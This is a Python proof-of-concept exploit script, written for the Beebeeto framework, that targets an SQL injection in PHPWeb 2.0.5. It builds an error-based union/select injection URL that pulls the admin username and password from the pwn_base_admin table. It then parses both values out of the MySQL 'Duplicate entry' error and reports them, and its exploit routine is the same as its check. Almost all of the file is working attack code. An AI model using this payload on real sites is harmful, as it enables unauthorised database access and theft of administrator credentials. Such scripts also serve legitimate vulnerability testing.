#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0034',           # 由Beebeeto官方编辑
            'name': 'PHPWeb 2.0.5 伪静态 SQL注入 POC',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-28',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPWeb',  # 漏洞所涉及的应用名称
            'vul_version': ['2.0.5'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['phpweb', 'SQL Injection', 'phpweb漏洞'],  # 漏洞相关tag
            'desc': 'N/A',  # 漏洞描述
            'references': ['http://blog.163.com/sjg_admin/blog/static/22682017120139192446513/'],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        if content:
            pattern = re.compile(r".*?Duplicate\s*entry\s*[']?[0-9]*:(?P<username>[^:]+):(?P<password>[^:]+)",re.I|re.S)
            match = pattern.match(content)
            if match == None:
                args['success'] = False
                return args
            username = match.group('username')
            password = match.group('password')
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['Username'] = username
            args['poc_ret']['Password'] = password
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())